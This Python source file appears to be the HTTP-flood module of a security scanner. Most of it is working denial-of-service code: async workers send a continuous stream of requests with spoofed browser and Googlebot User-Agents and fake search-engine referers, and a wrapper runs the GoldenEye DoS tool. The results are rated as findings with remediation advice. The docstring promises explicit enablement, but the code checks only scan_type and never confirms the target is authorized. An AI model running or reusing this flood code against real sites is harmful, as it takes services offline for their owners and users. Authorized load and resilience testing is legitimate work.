"""
HTTP Flood module — Phase 9.1.
Custom asyncio/aiohttp flood + GoldenEye.
Parameters: URL, method, concurrency, duration, intensity.
Monitors: response status, latency, connection errors.
Only runs on scan_type == 'full' and when explicitly enabled.
"""
from __future__ import annotations

import asyncio
import random
import shutil
import time
from typing import TYPE_CHECKING

from app.scanner.base import Finding, ScanResult, run_cmd

if TYPE_CHECKING:
    from app.scanner.context import ScanContext

# User-Agent pool for randomization
_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "curl/8.7.1",
    "python-httpx/0.27.0",
    "Go-http-client/2.0",
    "okhttp/4.12.0",
]

_REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://t.co/",
    "https://www.reddit.com/",
    "",
]

# Default flood parameters
_DEFAULT_CONCURRENCY = 50    # concurrent coroutines
_DEFAULT_DURATION    = 30    # seconds
_DEFAULT_TIMEOUT     = 5     # per-request timeout


# ── Async HTTP flood ──────────────────────────────────────────────────────────

class _FloodStats:
    __slots__ = ("sent", "success", "errors", "timeouts", "latencies")

    def __init__(self) -> None:
        self.sent      = 0
        self.success   = 0
        self.errors    = 0
        self.timeouts  = 0
        self.latencies: list[float] = []


async def _flood_worker(
    url: str,
    method: str,
    stats: _FloodStats,
    stop_event: asyncio.Event,
    req_timeout: float,
) -> None:
    try:
        import httpx
    except ImportError:
        return

    headers = {
        "User-Agent": random.choice(_USER_AGENTS),
        "Referer": random.choice(_REFERERS) + url,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
    }

    async with httpx.AsyncClient(
        verify=False,
        timeout=req_timeout,
        follow_redirects=False,
    ) as client:
        while not stop_event.is_set():
            t0 = time.monotonic()
            try:
                if method.upper() == "POST":
                    r = await client.post(url, headers=headers, content=b"x" * 512)
                else:
                    r = await client.get(url, headers=headers)
                latency = time.monotonic() - t0
                stats.sent += 1
                stats.latencies.append(latency)
                if 200 <= r.status_code < 600:
                    stats.success += 1
                else:
                    stats.errors += 1
            except httpx.TimeoutException:
                stats.timeouts += 1
                stats.sent += 1
            except Exception:
                stats.errors += 1
                stats.sent += 1


async def _run_http_flood(
    ctx: "ScanContext",
    url: str,
    method: str,
    concurrency: int,
    duration: int,
    req_timeout: float,
) -> _FloodStats:
    stats = _FloodStats()
    stop_event = asyncio.Event()

    await ctx.log(
        f"ddos_http: flood {method} {url} — {concurrency} workers, {duration}s",
        module="ddos_http",
    )

    workers = [
        asyncio.create_task(
            _flood_worker(url, method, stats, stop_event, req_timeout)
        )
        for _ in range(concurrency)
    ]

    # Monitor loop — log stats every 5 seconds
    elapsed = 0
    while elapsed < duration:
        await asyncio.sleep(5)
        elapsed += 5
        if stats.sent:
            avg_lat = (sum(stats.latencies[-200:]) / len(stats.latencies[-200:])) * 1000 if stats.latencies else 0
            await ctx.log(
                f"ddos_http: {elapsed}s — sent={stats.sent} ok={stats.success} "
                f"err={stats.errors} timeout={stats.timeouts} avg={avg_lat:.0f}ms",
                module="ddos_http",
            )

    stop_event.set()
    await asyncio.gather(*workers, return_exceptions=True)

    return stats


# ── GoldenEye ─────────────────────────────────────────────────────────────────

async def _run_goldeneye(
    ctx: "ScanContext",
    url: str,
    workers: int,
    duration: int,
) -> tuple[int, str, str]:
    """Run GoldenEye DoS tool (Python-based HTTP flood with header randomization)."""
    goldeneye = shutil.which("goldeneye") or shutil.which("goldeneye.py")
    if not goldeneye:
        # Try common paths
        from pathlib import Path
        for p in ["/opt/GoldenEye/goldeneye.py", "/usr/local/bin/goldeneye"]:
            if Path(p).exists():
                goldeneye = p
                break

    if not goldeneye:
        return -1, "", "GoldenEye not found"

    await ctx.log(
        f"ddos_http: GoldenEye {url} — {workers} workers, {duration}s",
        module="ddos_http",
    )

    cmd = [
        "python3" if goldeneye.endswith(".py") else goldeneye,
        *(["goldeneye"] if goldeneye.endswith(".py") else []),
        url,
        "-w", str(workers),
        "-s", str(duration),
        "-m", "get",
    ]
    if goldeneye.endswith(".py"):
        cmd = ["python3", goldeneye, url, "-w", str(workers), "-s", str(duration)]

    return run_cmd(cmd, timeout=duration + 30)


# ── Target availability check ─────────────────────────────────────────────────

async def _check_target(url: str, timeout: float = 5.0) -> tuple[bool, float | None]:
    """Return (reachable, response_time_ms)."""
    try:
        import httpx
        t0 = time.monotonic()
        async with httpx.AsyncClient(verify=False, timeout=timeout) as client:
            r = await client.get(url)
        return True, (time.monotonic() - t0) * 1000
    except Exception:
        return False, None


def _target_to_url(target: str) -> str:
    if target.startswith("http"):
        return target.rstrip("/")
    return f"http://{target}"


# ── Result builder ────────────────────────────────────────────────────────────

def _build_finding(
    target: str,
    url: str,
    method: str,
    stats: _FloodStats,
    duration: int,
    baseline_ms: float | None,
    tool: str,
) -> Finding:
    avg_lat = (
        (sum(stats.latencies) / len(stats.latencies)) * 1000
        if stats.latencies else 0
    )
    rps = stats.sent / duration if duration else 0
    timeout_pct = (stats.timeouts / stats.sent * 100) if stats.sent else 0

    # Assess impact
    if timeout_pct >= 50 or (baseline_ms and avg_lat > baseline_ms * 10):
        impact = "Service became unavailable (>50% timeouts or 10x latency increase)"
        severity = "critical"
        cvss = 7.5
    elif timeout_pct >= 20 or (baseline_ms and avg_lat > baseline_ms * 3):
        impact = "Service significantly degraded (20%+ timeouts or 3x latency)"
        severity = "high"
        cvss = 6.5
    else:
        impact = "Service remained responsive under load"
        severity = "medium"
        cvss = 4.3

    return Finding(
        type="ddos",
        title=f"HTTP flood ({tool}): {impact[:60]}",
        severity=severity,
        description=(
            f"HTTP {method} flood test against {url} for {duration}s using {tool}.\n\n"
            f"Statistics:\n"
            f"  Requests sent:   {stats.sent}\n"
            f"  Successful:      {stats.success}\n"
            f"  Errors:          {stats.errors}\n"
            f"  Timeouts:        {stats.timeouts} ({timeout_pct:.1f}%)\n"
            f"  Avg latency:     {avg_lat:.0f} ms\n"
            f"  Baseline:        {f'{baseline_ms:.0f} ms' if baseline_ms else 'N/A'}\n"
            f"  Throughput:      {rps:.1f} req/s\n\n"
            f"Impact: {impact}"
        ),
        evidence=(
            f"tool={tool} url={url} method={method} duration={duration}s "
            f"sent={stats.sent} timeouts={stats.timeouts}({timeout_pct:.1f}%) avg_lat={avg_lat:.0f}ms"
        ),
        remediation=(
            "Deploy a CDN/WAF with rate limiting (Cloudflare, AWS Shield, NGINX limit_req). "
            "Configure connection limits on the web server. "
            "Enable SYN cookies and TCP backlog tuning. "
            "Implement CAPTCHA for repeated clients. "
            "Use Anycast to distribute traffic across PoPs."
        ),
        cvss_score=cvss,
    )


# ── Main entry point ──────────────────────────────────────────────────────────

async def run_ddos_http(
    ctx: "ScanContext",
    target: str,
    scan_type: str,
    concurrency: int = _DEFAULT_CONCURRENCY,
    duration: int = _DEFAULT_DURATION,
    method: str = "GET",
) -> ScanResult:
    result = ScanResult()

    if scan_type != "full":
        return result

    url = _target_to_url(target)

    # Baseline check
    await ctx.log(f"ddos_http: baseline check {url}", module="ddos_http")
    reachable, baseline_ms = await _check_target(url)
    if not reachable:
        await ctx.log(f"ddos_http: target {url} unreachable before flood", level="warning", module="ddos_http")
        result.errors.append(f"target unreachable: {url}")
        return result

    await ctx.log(f"ddos_http: baseline latency = {baseline_ms:.0f}ms", module="ddos_http")

    # Phase 1: custom asyncio flood
    stats = await _run_http_flood(ctx, url, method, concurrency, duration, _DEFAULT_TIMEOUT)

    # Post-flood availability check
    still_up, post_lat = await _check_target(url)
    await ctx.log(
        f"ddos_http: post-flood — up={still_up} latency={f'{post_lat:.0f}ms' if post_lat else 'N/A'}",
        module="ddos_http",
    )

    result.findings.append(
        _build_finding(target, url, method, stats, duration, baseline_ms, "asyncio-flood")
    )

    # Phase 2: GoldenEye (if available)
    ge_workers = min(concurrency // 2, 25)
    rc, ge_out, ge_err = await _run_goldeneye(ctx, url, ge_workers, duration // 2)
    if rc != -1:
        # GoldenEye doesn't give structured stats — create a simple finding
        result.findings.append(Finding(
            type="ddos",
            title="HTTP flood (GoldenEye): layer-7 DoS test completed",
            severity="medium",
            description=(
                f"GoldenEye HTTP DoS test against {url}.\n"
                f"Workers: {ge_workers}, Duration: {duration // 2}s\n\n"
                f"Output:\n{(ge_out + ge_err)[:400]}"
            ),
            evidence=f"goldeneye url={url} workers={ge_workers} duration={duration // 2}s",
            remediation=(
                "Deploy rate limiting and connection throttling. "
                "Use a WAF to detect and block flood patterns."
            ),
            cvss_score=4.3,
        ))

    total = len(result.findings)
    await ctx.log(f"ddos_http: completed — {total} finding(s)", module="ddos_http")
    return result
